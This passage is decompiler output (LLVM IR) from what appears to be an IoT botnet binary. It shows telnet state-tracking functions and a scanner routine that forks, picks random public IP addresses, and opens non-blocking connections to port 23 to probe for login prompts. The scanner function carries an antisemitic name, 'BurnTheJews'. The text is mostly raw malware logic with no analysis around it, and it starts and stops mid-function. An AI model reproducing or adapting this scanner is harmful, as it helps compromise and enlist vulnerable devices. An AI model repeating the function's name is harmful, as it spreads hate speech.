  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v3_8050a21 = inttoptr i32 %tmp5 to i8*
  %v4_8050a21 = call i32 @__GI_memset(i8* %v3_8050a21, i32 0, i32 %tmp6)
  %v4_8050a35 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp4, i32 %tmp5, i32 %tmp6)
  %v2_8050a49 = inttoptr i32 %tmp1 to i32*
  %v3_8050a49 = call i32 @contains_string(i32 %tmp5, i32* %v2_8050a49)
  %v1_8050a51 = icmp ne i32 %v3_8050a49, 0
  %. = zext i1 %v1_8050a51 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %tmp5, { 2, 0, 1 }
  uselistorder i32 (i32, i32*)* @contains_string, { 2, 0, 1 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_8050a73 = add i32 %tmp1, 4
  %v2_8050a73 = inttoptr i32 %v1_8050a73 to i32*
  %v3_8050a73 = load i32, i32* %v2_8050a73, align 4
  %v1_8050a7f = call i32 @__GI_inet_ntoa(i32 %v3_8050a73)
  ret i32 %v1_8050a7f
}

define i32 @advance_telstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_8050a8f = icmp eq i32 %arg2, 0
  %v6_8050a8f = trunc i32 %arg2 to i8
  %v1_8050a93 = icmp eq i1 %v4_8050a8f, false
  br i1 %v1_8050a93, label %entry.dec_label_pc_8050aa6_crit_edge, label %dec_label_pc_8050a95

entry.dec_label_pc_8050aa6_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8050aa6

dec_label_pc_8050a95:                             ; preds = %entry
  %v2_8050a98 = load i32, i32* %arg1, align 4
  %v1_8050a9e = call i32 @close(i32 %v2_8050a98)
  br label %dec_label_pc_8050aa6

dec_label_pc_8050aa6:                             ; preds = %entry.dec_label_pc_8050aa6_crit_edge, %dec_label_pc_8050a95
  %v1_8050aa9 = add i32 %tmp2, 13
  %v2_8050aa9 = inttoptr i32 %v1_8050aa9 to i32*
  store i32 0, i32* %v2_8050aa9, align 4
  %v3_8050ab8 = add i32 %tmp2, 8
  %v4_8050ab8 = inttoptr i32 %v3_8050ab8 to i8*
  store i8 %v6_8050a8f, i8* %v4_8050ab8, align 1
  %v1_8050abe = add i32 %tmp2, 19
  %v2_8050abe = inttoptr i32 %v1_8050abe to i32*
  %v3_8050abe = load i32, i32* %v2_8050abe, align 4
  %v3_8050acc = inttoptr i32 %v3_8050abe to i8*
  %v4_8050acc = call i32 @__GI_memset(i8* %v3_8050acc, i32 0, i32 1024)
  ret i32 %v4_8050acc

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050aa6, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8050ae4 = inttoptr i32 %arg1 to i32*
  %v3_8050ae4 = call i32 @advance_telstate(i32* %v2_8050ae4, i32 0)
  %v1_8050aef = add i32 %arg1, 9
  %v2_8050aef = inttoptr i32 %v1_8050aef to i8*
  store i8 1, i8* %v2_8050aef, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @BurnTheJews(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i8*, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050af8 = load i32, i32* @edi, align 4
  %v0_8050af9 = load i32, i32* @esi, align 4
  %v0_8050afa = load i32, i32* @ebx, align 4
  store i32 %v0_8050afa, i32* %stack_var_-16, align 4
  %v15_8050afb = ptrtoint i8** %stack_var_-636 to i32
  store i32 %v15_8050afb, i32* %eax.global-to-local, align 4
  %v1_8050b09 = call i32 @fork(i32 %v15_8050afb)
  store i32 %v1_8050b09, i32* %eax.global-to-local, align 4
  %v10_8050b0e = icmp eq i32 %v1_8050b09, -1
  br i1 %v10_8050b0e, label %dec_label_pc_8051d9b, label %dec_label_pc_8050b17

dec_label_pc_8050b17:                             ; preds = %entry
  %v1_8050b17 = call i32 @getdtablesize(i32 %v15_8050afb)
  %v1_8050b1c = add i32 %v1_8050b17, -100
  %v7_8050b28 = icmp sgt i32 %v1_8050b1c, %arg2
  br i1 %v7_8050b28, label %dec_label_pc_8050b2a, label %dec_label_pc_8050b30

dec_label_pc_8050b2a:                             ; preds = %dec_label_pc_8050b17
  br label %dec_label_pc_8050b30

dec_label_pc_8050b30:                             ; preds = %dec_label_pc_8050b17, %dec_label_pc_8050b2a
  %stack_var_-56.0 = phi i32 [ %arg2, %dec_label_pc_8050b2a ], [ %v1_8050b1c, %dec_label_pc_8050b17 ]
  %storemerge = phi i32 [ %arg2, %dec_label_pc_8050b2a ], [ %v1_8050b1c, %dec_label_pc_8050b17 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_8050b3e = call i32 @htons(i32 23)
  %v2_8050b54 = ptrtoint i32* %stack_var_-604 to i32
  %v15_8050b5a = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_8050b5a, i32* %eax.global-to-local, align 4
  %v3_8050b5e = bitcast i32* %stack_var_-596 to i8*
  %v4_8050b5e = call i32 @__GI_memset(i8* %v3_8050b5e, i32 0, i32 8)
  store i32 %v4_8050b5e, i32* %eax.global-to-local, align 4
  %v1_8050b6e = call i32 @malloc(i32 1025)
  store i32 %v1_8050b6e, i32* %eax.global-to-local, align 4
  %v3_8050b86 = inttoptr i32 %v1_8050b6e to i8*
  %v4_8050b86 = call i32 @__GI_memset(i8* %v3_8050b86, i32 0, i32 1025)
  %v2_8050b9c = mul i32 %stack_var_-56.0, 23
  %v1_8050ba1 = add i32 %v2_8050b9c, 30
  %v2_8050ba4 = and i32 %v1_8050ba1, -16
  %v2_8050baa = sub i32 %v15_8050afb, %v2_8050ba4
  %v1_8050bb8 = add i32 %v2_8050baa, 15
  %v2_8050bbb = and i32 %v1_8050bb8, -16
  %v2_8050bd8 = mul i32 %stack_var_-56.0, 5
  store i32 %v2_8050bd8, i32* %eax.global-to-local, align 4
  store i32 %v2_8050bbb, i32* %edx.global-to-local, align 4
  %v2_8050be0 = add i32 %v2_8050baa, -8
  %v3_8050be0 = inttoptr i32 %v2_8050be0 to i32*
  store i32 %v2_8050bd8, i32* %v3_8050be0, align 4
  %v1_8050be1 = add i32 %v2_8050baa, -12
  %v2_8050be1 = inttoptr i32 %v1_8050be1 to i32*
  store i32 0, i32* %v2_8050be1, align 4
  %v0_8050be3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050be3 = add i32 %v2_8050baa, -16
  %v3_8050be3 = inttoptr i32 %v2_8050be3 to i32*
  store i32 %v0_8050be3, i32* %v3_8050be3, align 4
  %v3_8050be4 = inttoptr i32 %v2_8050bbb to i8*
  %v4_8050be4 = call i32 @__GI_memset(i8* %v3_8050be4, i32 %tmp16, i32 %v15_8050afb)
  %v0_8050be9 = load i32, i32* @esp, align 4
  %v1_8050be9 = add i32 %v0_8050be9, 16
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_8050c5762 = icmp sgt i32 %stack_var_-56.0, 0
  br i1 %v5_8050c5762, label %dec_label_pc_8050bf5, label %dec_label_pc_8050c59.preheader

dec_label_pc_8050bf5:                             ; preds = %dec_label_pc_8050b30, %dec_label_pc_8050bf5.dec_label_pc_8050bf5_crit_edge
  %v0_8050c09 = phi i32 [ %v0_8050c09.pre, %dec_label_pc_8050bf5.dec_label_pc_8050bf5_crit_edge ], [ %v1_8050be9, %dec_label_pc_8050b30 ]
  %storemerge363 = phi i32 [ %v4_8050c4e, %dec_label_pc_8050bf5.dec_label_pc_8050bf5_crit_edge ], [ 0, %dec_label_pc_8050b30 ]
  store i32 %storemerge363, i32* %edx.global-to-local, align 4
  %v2_8050c04 = mul i32 %storemerge363, 23
  %v2_8050c06 = add i32 %v2_8050c04, %v2_8050bbb
  store i32 %v2_8050c06, i32* %eax.global-to-local, align 4
  %v1_8050c0c = add i32 %v0_8050c09, -8
  %v2_8050c0c = inttoptr i32 %v1_8050c0c to i32*
  store i32 23, i32* %v2_8050c0c, align 4
  %v1_8050c0e = add i32 %v0_8050c09, -12
  %v2_8050c0e = inttoptr i32 %v1_8050c0e to i32*
  store i32 0, i32* %v2_8050c0e, align 4
  %v0_8050c10 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050c10 = add i32 %v0_8050c09, -16
  %v3_8050c10 = inttoptr i32 %v2_8050c10 to i32*
  store i32 %v0_8050c10, i32* %v3_8050c10, align 4
  %v3_8050c11 = inttoptr i32 %storemerge363 to i8*
  %v4_8050c11 = call i32 @__GI_memset(i8* %v3_8050c11, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  %v1_8050c2c = add i32 %v2_8050c06, 9
  %v1_8050c2f = inttoptr i32 %v1_8050c2c to i8*
  store i8 1, i8* %v1_8050c2f, align 1
  %v1_8050c45 = add i32 %v2_8050c06, 16
  store i32 %v1_8050c45, i32* %edx.global-to-local, align 4
  %v2_8050c4b = add i32 %v2_8050c06, 19
  %v3_8050c4b = inttoptr i32 %v2_8050c4b to i32*
  store i32 %v1_8050b6e, i32* %v3_8050c4b, align 4
  %v4_8050c4e = add nuw nsw i32 %storemerge363, 1
  store i32 %v4_8050c4e, i32* %eax.global-to-local, align 4
  %v5_8050c57 = icmp slt i32 %v4_8050c4e, %stack_var_-56.0
  br i1 %v5_8050c57, label %dec_label_pc_8050bf5.dec_label_pc_8050bf5_crit_edge, label %dec_label_pc_8050c59.preheader

dec_label_pc_8050bf5.dec_label_pc_8050bf5_crit_edge: ; preds = %dec_label_pc_8050bf5
  %v0_8050c09.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050bf5

dec_label_pc_8050c59.preheader:                   ; preds = %dec_label_pc_8050bf5, %dec_label_pc_8050b30
  %v2_8050fe1 = ptrtoint i32* %stack_var_-316 to i32
  %tmp41 = bitcast i32* %stack_var_-316 to i8*
  %v2_8051055 = ptrtoint i32* %stack_var_-324 to i32
  %v2_80510c1 = ptrtoint i32* %stack_var_-328 to i32
  %v2_80510c8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8050c76 = or i32 %v2_8050bbb, 13
  %v2_8050eb7 = or i32 %v2_8050bbb, 4
  br label %dec_label_pc_8050c59

dec_label_pc_8050c59:                             ; preds = %dec_label_pc_8050c59, %dec_label_pc_8051d87, %dec_label_pc_8050c59.preheader
  %stack_var_-628.0 = phi i32 [ %tmp7, %dec_label_pc_8050c59.preheader ], [ %stack_var_-628.0, %dec_label_pc_8050c59 ], [ %stack_var_-628.1, %dec_label_pc_8051d87 ]
  %stack_var_-624.0 = phi i32 [ %tmp8, %dec_label_pc_8050c59.preheader ], [ %stack_var_-624.0, %dec_label_pc_8050c59 ], [ %stack_var_-624.1, %dec_label_pc_8051d87 ]
  %stack_var_-24.0 = phi i32 [ %tmp13, %dec_label_pc_8050c59.preheader ], [ %stack_var_-24.0, %dec_label_pc_8050c59 ], [ %stack_var_-24.1, %dec_label_pc_8051d87 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_8050c5762, label %dec_label_pc_8050c65, label %dec_label_pc_8050c59

dec_label_pc_8050c65:                             ; preds = %dec_label_pc_8050c59, %dec_label_pc_8051d87
  %storemerge53 = phi i32 [ %v4_8051d87, %dec_label_pc_8051d87 ], [ 0, %dec_label_pc_8050c59 ]
  %stack_var_-24.252 = phi i32 [ %stack_var_-24.1, %dec_label_pc_8051d87 ], [ %stack_var_-24.0, %dec_label_pc_8050c59 ]
  %stack_var_-624.251 = phi i32 [ %stack_var_-624.1, %dec_label_pc_8051d87 ], [ %stack_var_-624.0, %dec_label_pc_8050c59 ]
  %stack_var_-628.250 = phi i32 [ %stack_var_-628.1, %dec_label_pc_8051d87 ], [ %stack_var_-628.0, %dec_label_pc_8050c59 ]
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v2_8050c74 = mul i32 %storemerge53, 23
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8050c76 = add i32 %v2_8050c76, %v2_8050c74
  %v4_8050c76 = inttoptr i32 %v3_8050c76 to i32*
  %v5_8050c76 = load i32, i32* %v4_8050c76, align 4
  store i32 %v5_8050c76, i32* %eax.global-to-local, align 4
  %v1_8050c7a = icmp eq i32 %v5_8050c76, 0
  %v1_8050c7c = icmp eq i1 %v1_8050c7a, false
  br i1 %v1_8050c7c, label %dec_label_pc_8050ca2, label %dec_label_pc_8050c7e

dec_label_pc_8050c7e:                             ; preds = %dec_label_pc_8050c65
  store i32 %storemerge53, i32* @ebx, align 4
  %v0_8050c81 = load i32, i32* @esp, align 4
  %v1_8050c84 = add i32 %v0_8050c81, -16
  %v2_8050c84 = inttoptr i32 %v1_8050c84 to i32*
  store i32 0, i32* %v2_8050c84, align 4
  %v1_8050c86 = inttoptr i32 %storemerge53 to i32*
  %v2_8050c86 = call i32 @__GI_time(i32* %v1_8050c86)
  store i32 %v2_8050c86, i32* %edx.global-to-local, align 4
  %v0_8050c93 = load i32, i32* @ebx, align 4
  %v2_8050c9c = mul i32 %v0_8050c93, 23
  store i32 %v2_8050c9c, i32* %eax.global-to-local, align 4
  %v4_8050c9e = add i32 %v2_8050c76, %v2_8050c9c
  %v5_8050c9e = inttoptr i32 %v4_8050c9e to i32*
  store i32 %v2_8050c86, i32* %v5_8050c9e, align 4
  br label %dec_label_pc_8050ca2

dec_label_pc_8050ca2:                             ; preds = %dec_label_pc_8050c65, %dec_label_pc_8050c7e
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v2_8050cb3 = add i32 %v2_8050c74, %v2_8050bbb
  %v1_8050cb5 = add i32 %v2_8050cb3, 8
  store i32 %v1_8050cb5, i32* %eax.global-to-local, align 4
  %v1_8050cb8 = inttoptr i32 %v1_8050cb5 to i8*
  %v2_8050cb8 = load i8, i8* %v1_8050cb8, align 1
  %v3_8050cb8 = zext i8 %v2_8050cb8 to i32
  %v5_8050cb8 = and i32 %v1_8050cb5, -256
  %v6_8050cb8 = or i32 %v3_8050cb8, %v5_8050cb8
  store i32 %v6_8050cb8, i32* %eax.global-to-local, align 4
  store i32 %v3_8050cb8, i32* %edx.global-to-local, align 4
  store i32 %v3_8050cb8, i32* @edi, align 4
  %v1_8050cda = mul nuw nsw i32 %v3_8050cb8, 4
  %v2_8050cda = add nuw nsw i32 %v1_8050cda, 134652848
  %v3_8050cda = inttoptr i32 %v2_8050cda to i32*
  %v4_8050cda = load i32, i32* %v3_8050cda, align 4
  store i32 %v4_8050cda, i32* %eax.global-to-local, align 4
  switch i8 %v2_8050cb8, label %dec_label_pc_8051d87 [
    i8 0, label %dec_label_pc_8050ce3
    i8 1, label %dec_label_pc_8050fd7
    i8 2, label %dec_label_pc_80511fb
    i8 3, label %dec_label_pc_8051337
    i8 4, label %dec_label_pc_8051462
    i8 5, label %dec_label_pc_805159e
    i8 6, label %dec_label_pc_80516c9
    i8 7, label %dec_label_pc_80518fa
  ]

dec_label_pc_8050ce3:                             ; preds = %dec_label_pc_8050ca2
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8050cf6 = add i32 %v2_8050cb3, 9
  store i32 %v1_8050cf6, i32* %eax.global-to-local, align 4
  %v1_8050cf9 = inttoptr i32 %v1_8050cf6 to i8*
  %v2_8050cf9 = load i8, i8* %v1_8050cf9, align 1
  %v10_8050cfb = icmp eq i8 %v2_8050cf9, 1
  %v1_8050cfd = icmp eq i1 %v10_8050cfb, false
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  br i1 %v1_8050cfd, label %dec_label_pc_8050d7c, label %dec_label_pc_8050cff

dec_label_pc_8050cff:                             ; preds = %dec_label_pc_8050ce3
  %v1_8050d12 = add i32 %v2_8050cb3, 16
  store i32 %v1_8050d12, i32* %eax.global-to-local, align 4
  %v1_8050d15 = add i32 %v2_8050cb3, 19
  %v2_8050d15 = inttoptr i32 %v1_8050d15 to i32*
  %v3_8050d15 = load i32, i32* %v2_8050d15, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  %v0_8050d2f = load i32, i32* @esp, align 4
  %v1_8050d32 = add i32 %v0_8050d2f, -8
  %v2_8050d32 = inttoptr i32 %v1_8050d32 to i32*
  store i32 23, i32* %v2_8050d32, align 4
  %v1_8050d34 = add i32 %v0_8050d2f, -12
  %v2_8050d34 = inttoptr i32 %v1_8050d34 to i32*
  store i32 0, i32* %v2_8050d34, align 4
  %v0_8050d36 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050d36 = add i32 %v0_8050d2f, -16
  %v3_8050d36 = inttoptr i32 %v2_8050d36 to i32*
  store i32 %v0_8050d36, i32* %v3_8050d36, align 4
  %v3_8050d37 = inttoptr i32 %v3_8050cb8 to i8*
  %v4_8050d37 = call i32 @__GI_memset(i8* %v3_8050d37, i32 %v15_8050afb, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v1_8050d12, i32* %edx.global-to-local, align 4
  store i32 %v3_8050d15, i32* %eax.global-to-local, align 4
  store i32 %v3_8050d15, i32* %v2_8050d15, align 4
  store i32 %storemerge53, i32* @ebx, align 4
  %v2_8050d5e = call i32 @getRandomPublicIP(i32 %v3_8050d15, i32 %stack_var_-24.252)
  store i32 %v2_8050d5e, i32* %edx.global-to-local, align 4
  %v0_8050d68 = load i32, i32* @ebx, align 4
  %v2_8050d71 = mul i32 %v0_8050d68, 23
  store i32 %v2_8050d71, i32* %eax.global-to-local, align 4
  %v4_8050d73 = add i32 %v2_8050eb7, %v2_8050d71
  %v5_8050d73 = inttoptr i32 %v4_8050d73 to i32*
  store i32 %v2_8050d5e, i32* %v5_8050d73, align 4
  br label %dec_label_pc_8050e70

dec_label_pc_8050d7c:                             ; preds = %dec_label_pc_8050ce3
  %v5_8050cf9 = and i32 %v1_8050cf6, -256
  store i32 %v1_8050cf6, i32* %eax.global-to-local, align 4
  %v2_8050d92 = load i8, i8* %v1_8050cf9, align 1
  %v3_8050d92 = zext i8 %v2_8050d92 to i32
  %v6_8050d92 = or i32 %v3_8050d92, %v5_8050cf9
  store i32 %v6_8050d92, i32* %eax.global-to-local, align 4
  %v4_8050d94 = icmp eq i8 %v2_8050d92, 0
  %v1_8050d96 = icmp eq i1 %v4_8050d94, false
  br i1 %v1_8050d96, label %dec_label_pc_8050e70, label %dec_label_pc_8050d9c

dec_label_pc_8050d9c:                             ; preds = %dec_label_pc_8050d7c
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8050daf = add i32 %v2_8050cb3, 10
  store i32 %v1_8050daf, i32* %eax.global-to-local, align 4
  %v1_8050db2 = inttoptr i32 %v1_8050daf to i8*
  %v2_8050db2 = load i8, i8* %v1_8050db2, align 1
  %v1_8050db4 = add i8 %v2_8050db2, 1
  store i8 %v1_8050db4, i8* %v1_8050db2, align 1
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  %v1_8050ddf = add i32 %v2_8050cb3, 11
  store i32 %v1_8050ddf, i32* %eax.global-to-local, align 4
  %v1_8050de2 = inttoptr i32 %v1_8050ddf to i8*
  %v2_8050de2 = load i8, i8* %v1_8050de2, align 1
  %v1_8050de4 = add i8 %v2_8050de2, 1
  store i8 %v1_8050de4, i8* %v1_8050de2, align 1
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_8050ddf, i32* %eax.global-to-local, align 4
  %v2_8050e12 = load i8, i8* %v1_8050de2, align 1
  %v10_8050e14 = icmp eq i8 %v2_8050e12, 78
  %v1_8050e16 = icmp eq i1 %v10_8050e14, false
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050cb3, i32* %eax.global-to-local, align 4
  br i1 %v1_8050e16, label %dec_label_pc_8050e36, label %dec_label_pc_8050e18

dec_label_pc_8050e18:                             ; preds = %dec_label_pc_8050d9c
  store i32 %v1_8050cf6, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v1_8050cf9, align 1
  br label %dec_label_pc_8051d87

dec_label_pc_8050e36:                             ; preds = %dec_label_pc_8050d9c
  %v5_8050db2 = and i32 %v1_8050daf, -256
  store i32 %v1_8050daf, i32* %eax.global-to-local, align 4
  %v2_8050e4c = load i8, i8* %v1_8050db2, align 1
  %v3_8050e4c = zext i8 %v2_8050e4c to i32
  %v6_8050e4c = or i32 %v3_8050e4c, %v5_8050db2
  store i32 %v6_8050e4c, i32* %eax.global-to-local, align 4
  %v10_8050e4e = icmp eq i8 %v2_8050e4c, 72
  %v1_8050e50 = icmp eq i1 %v10_8050e4e, false
  br i1 %v1_8050e50, label %dec_label_pc_8050e70, label %dec_label_pc_8050e52

dec_label_pc_8050e52:                             ; preds = %dec_label_pc_8050e36
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v1_8050cf6, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v1_8050cf9, align 1
  br label %dec_label_pc_8051d87

dec_label_pc_8050e70:                             ; preds = %dec_label_pc_8050e36, %dec_label_pc_8050d7c, %dec_label_pc_8050cff
  store i32 2, i32* %stack_var_-604, align 4
  %v0_8050e79 = load i32, i32* @esp, align 4
  %v1_8050e7c = add i32 %v0_8050e79, -16
  %v2_8050e7c = inttoptr i32 %v1_8050e7c to i32*
  store i32 23, i32* %v2_8050e7c, align 4
  %v0_8050e7e = load i32, i32* %stack_var_-604, align 4
  %v1_8050e7e = call i32 @htons(i32 %v0_8050e7e)
  %v0_8050e83 = load i32, i32* @esp, align 4
  %v1_8050e90 = add i32 %v0_8050e83, 8
  %v2_8050e90 = inttoptr i32 %v1_8050e90 to i32*
  store i32 8, i32* %v2_8050e90, align 4
  %v1_8050e92 = add i32 %v0_8050e83, 4
  %v2_8050e92 = inttoptr i32 %v1_8050e92 to i32*
  store i32 0, i32* %v2_8050e92, align 4
  store i32 %v15_8050b5a, i32* %eax.global-to-local, align 4
  %v3_8050e9d = inttoptr i32 %v0_8050e83 to i32*
  store i32 %v15_8050b5a, i32* %v3_8050e9d, align 4
  %sext = mul i32 %v1_8050e7e, 65536
  %v1_8050e9e = sdiv i32 %sext, 65536
  %v4_8050e9e = inttoptr i32 %v1_8050e9e to i8*
  %v5_8050e9e = call i32 @__GI_memset(i8* %v4_8050e9e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8050ea3 = load i32, i32* @esp, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8050eb7 = add i32 %v2_8050eb7, %v2_8050c74
  %v4_8050eb7 = inttoptr i32 %v3_8050eb7 to i32*
  %v5_8050eb7 = load i32, i32* %v4_8050eb7, align 4
  store i32 %v5_8050eb7, i32* %eax.global-to-local, align 4
  store i32 %storemerge53, i32* @ebx, align 4
  %v1_8050ec7 = add i32 %v0_8050ea3, 8
  %v2_8050ec7 = inttoptr i32 %v1_8050ec7 to i32*
  store i32 0, i32* %v2_8050ec7, align 4
  %v1_8050ec9 = add i32 %v0_8050ea3, 4
  %v2_8050ec9 = inttoptr i32 %v1_8050ec9 to i32*
  store i32 1, i32* %v2_8050ec9, align 4
  %v2_8050ecb = inttoptr i32 %v0_8050ea3 to i32*
  store i32 2, i32* %v2_8050ecb, align 4
  %v1_8050ecd = load i32, i32* %stack_var_-596, align 4
  %v3_8050ecd = call i32 @socket(i32 %v5_8050eb7, i32 %v1_8050ecd, i32 ptrtoint (i32* @0 to i32))
  %v0_8050eda = load i32, i32* @ebx, align 4
  %v2_8050ee3 = mul i32 %v0_8050eda, 23
  %v3_8050ee5 = add i32 %v2_8050ee3, %v2_8050bbb
  %v4_8050ee5 = inttoptr i32 %v3_8050ee5 to i32*
  store i32 %v3_8050ecd, i32* %v4_8050ee5, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v3_8050ef9 = inttoptr i32 %v2_8050cb3 to i32*
  %v4_8050ef9 = load i32, i32* %v3_8050ef9, align 4
  store i32 %v4_8050ef9, i32* %eax.global-to-local, align 4
  %v10_8050efc = icmp eq i32 %v4_8050ef9, -1
  br i1 %v10_8050efc, label %dec_label_pc_8051d87, label %dec_label_pc_8050f05

dec_label_pc_8050f05:                             ; preds = %dec_label_pc_8050e70
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8050f16 = load i32, i32* %v3_8050ef9, align 4
  store i32 %v4_8050f16, i32* %eax.global-to-local, align 4
  %v0_8050f19 = load i32, i32* @esp, align 4
  %v1_8050f1c = add i32 %v0_8050f19, -8
  %v2_8050f1c = inttoptr i32 %v1_8050f1c to i32*
  store i32 0, i32* %v2_8050f1c, align 4
  %v1_8050f1e = add i32 %v0_8050f19, -12
  %v2_8050f1e = inttoptr i32 %v1_8050f1e to i32*
  store i32 3, i32* %v2_8050f1e, align 4
  %v0_8050f20 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050f20 = add i32 %v0_8050f19, -16
  %v3_8050f20 = inttoptr i32 %v2_8050f20 to i32*
  store i32 %v0_8050f20, i32* %v3_8050f20, align 4
  %v1_8050f21 = call i32 @fcntl(i32 %v5_8050eb7)
  %v0_8050f26 = load i32, i32* @esp, align 4
  %v12_8050f2b = or i32 %v1_8050f21, 2048
  store i32 %v12_8050f2b, i32* @ecx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ebx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8050f3f = load i32, i32* %v3_8050ef9, align 4
  store i32 %v4_8050f3f, i32* %eax.global-to-local, align 4
  %v2_8050f45 = add i32 %v0_8050f26, 8
  %v3_8050f45 = inttoptr i32 %v2_8050f45 to i32*
  store i32 %v12_8050f2b, i32* %v3_8050f45, align 4
  %v1_8050f46 = add i32 %v0_8050f26, 4
  %v2_8050f46 = inttoptr i32 %v1_8050f46 to i32*
  store i32 4, i32* %v2_8050f46, align 4
  %v0_8050f48 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050f48 = inttoptr i32 %v0_8050f26 to i32*
  store i32 %v0_8050f48, i32* %v3_8050f48, align 4
  %v1_8050f49 = call i32 @fcntl(i32 %v5_8050eb7)
  %v0_8050f4e = load i32, i32* @esp, align 4
  store i32 %v2_8050b54, i32* @ebx, align 4
  store i32 %storemerge53, i32* %edx.global-to-local, align 4
  store i32 %v2_8050bbb, i32* @ecx, align 4
  store i32 %v2_8050c74, i32* %eax.global-to-local, align 4
  %v4_8050f68 = load i32, i32* %v3_8050ef9, align 4
  store i32 %v4_8050f68, i32* %eax.global-to-local, align 4
  %v1_8050f6e = add i32 %v0_8050f4e, 8
  %v2_8050f6e = inttoptr i32 %v1_8050f6e to i32*
  store i32 16, i32* %v2_8050f6e, align 4
  %v2_8050f70 = add i32 %v0_8050f4e, 4
  %v3_8050f70 = inttoptr i32 %v2_8050f70 to i32*
  store i32 %v2_8050b54, i32* %v3_8050f70, align 4
  %v0_8050f71 = load i32, i32* %eax.global-to-local, align 4
  %v3_8050f71 = inttoptr i32 %v0_8050f4e to i32*
  store i32 %v0_8050f71, i32* %v3_8050f71, align 4
  %v1_8050f72 = load i32, i32* %stack_var_-596, align 4
  %v3_8050f72 = call i32 @connect(i32 %v5_8050eb7, i32 %v1_8050f72, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050f72, i32* %eax.global-to-local, align 4
  %v0_8050f77 = load i32, i32* @esp, align 4
  %v1_8050f77 = add i32 %v0_8050f77, 16
  %v10_8050f7a = icmp eq i32 %v3_8050f72, -1
  %v1_8050f7d = icmp eq i1 %v10_8050f7a, false
  br i1 %v1_8050f7d, label %dec_label_pc_8050fb0, label %dec_label_pc_8050f7f

dec_label_pc_8050f7f:                             ; preds = %dec_label_pc_8050f05
  %v1_8050f7f = call i32 @__errno_location(i32 %v5_8050eb7)
  store i32 %v1_8050f7f, i32* %eax.global-to-local, align 4
  %v1_8050f84 = inttoptr i32 %v1_8050f7f to i32*
  %v2_8050f84 = load i32, i32* %v1_8050f84, align 4
  store i32 %v2_8050f84, i32* %eax.global-to-local, align 4
  %v9_8050f86 = icmp eq i32 %v2_8050f84, 115
  br i1 %v9_8050f86, label %dec_label_pc_8050f7f.dec_label_pc_8050fb0_crit_edge, label %dec_label_pc_8050f8b

dec_label_pc_8050f7f.dec_label_pc_8050fb0_crit_edge: ; preds = %dec_label_pc_8050f7f
  %v0_8050fc4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050fb0

